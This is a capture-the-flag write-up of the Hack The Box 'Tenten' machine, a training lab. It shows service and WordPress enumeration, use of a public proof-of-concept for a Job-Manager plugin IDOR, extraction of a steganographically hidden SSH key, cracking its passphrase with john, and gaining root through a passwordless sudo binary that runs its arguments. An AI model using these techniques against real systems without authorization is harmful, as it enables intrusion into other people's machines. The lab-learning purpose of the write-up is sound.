# Hackthebox Tenten

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.

### Attack Summary

1. Wordpress plugin Job-manager IDOR
2. Steganography to get private key
3. Sudo misconfiguration


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Fri Dec 28 11:42:30 2018 as: nmap -v -sV -p- -T4 -oA tenten_full 10.10.10.10
Nmap scan report for 10.10.10.10
Host is up (0.075s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the website on port 80 we are presented with a wordpress site for some form of job posting.

Let's scan the site with wpscan.

```
wpscan --url http://10.10.10.10 -o tenten_wordpress.txt --enumerate u,ap,cb,dbe
_______________________________________________________________
        __          _______   _____                                   
        \ \        / /  __ \ / ____|                         
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                           
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |                   
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.1
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://10.10.10.10/
[+] Started: Fri Dec 28 11:50:12 2018

Interesting Finding(s):

[+] http://10.10.10.10/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.10.10/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.10.10/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://10.10.10.10/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - http://10.10.10.10/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
 |
 | [!] 32 vulnerabilities identified:
 |
 | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8807
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
 |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
 |      - http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
 |      - https://core.trac.wordpress.org/ticket/25239

...snip

 [+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.10/wp-content/themes/twentyseventeen/
 | Last Updated: 2018-12-19T00:00:00.000Z
 | Readme: http://10.10.10.10/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'

[i] Plugin(s) Identified:

[+] job-manager
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8167
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
 |
 | Version: 7.2.5 (80% confidence)
 | Detected By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt


[i] No Config Backups Found.


[i] No DB Exports Found.

[i] User(s) Identified:

[+] takis
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Finished: Fri Dec 28 11:50:18 2018
[+] Requests Done: 50
[+] Cached Requests: 6
[+] Data Sent: 9.595 KB
[+] Data Received: 866.005 KB
[+] Memory used: 27.219 MB
[+] Elapsed time: 00:00:05
```

There are some vulnerabilities in the running version of Wordpress. There is also a plugin called job-manager that suffers from a IDOR bug.

### Content Discovery 

I ran a Gobuster scan against the application but it did not return anything interesting.

## Initial Compromise

Lets check the IDOR issue in the plugin. This site describes the issue: https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/

So the issue is that we basically can locate and access what other people have uploaded by incrementing the number in the following URL: http://10.10.10.10/index.php/jobs/apply/8/.

Looping through titles from 1 to 20 I found one that seemed interesting "job Application: HackerAccessGranted". Using the poc from the website and modifying it a bit to also look for images we get the followingh hit:

```
root@kali:~/htb/tenten# python poc.py 
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10 
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```

This is where this box turns very unrealistic and more like a ctf. There is a hidden file within the image. Steganography is a common thing to use in ctfs.

The following command will extract the file which is a private key. 
```
root@kali:~/htb/tenten# steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
wrote extracted data to "id_rsa".
```

The key is encrypted so we need to crack it. We can use 22h2john to output the key in a crackable format:

```
root@kali:~/htb/tenten# ssh2john id_rsa > crack.txt

root@kali:~/htb/tenten# john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
1g 0:00:00:01 DONE (2018-12-28 13:14) 0.6666g/s 520024p/s 520024c/s 520024C/s superpassword
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We we found the password "superpassword" and can now log in as the user takis with the private key.

```
root@kali:~/htb/tenten# ssh takis@10.10.10.10 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Fri May  5 23:05:36 2017
takis@tenten:~$ 
```

## Pivilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several scripts that automates this process for us.

So I go to /dev/shm and upload a privsc script called LinEnum.

The script gives us the following juicy stuff

```
[+] We can sudo without supplying a password!                                                                         
Matching Defaults entries for takis on tenten:                                  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
                                                                                                                        
User takis may run the following commands on tenten:                                                                                
    (ALL : ALL) ALL                                                                                                             
    (ALL) NOPASSWD: /bin/fuckin  
```

Let's runthe binary and see what it does

```
takis@tenten:~$ sudo /bin/fuckin
```

Nothing happens, so we could tru to just run strings onthe binary and see what se get.

```
takis@tenten:~$ strings /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
takis@tenten:~$ sudo /bin/fuckin bash
root@tenten:~# id
uid=0(root) gid=0(root) groups=0(root)
```
So it needed an argument that it seems to just execute.
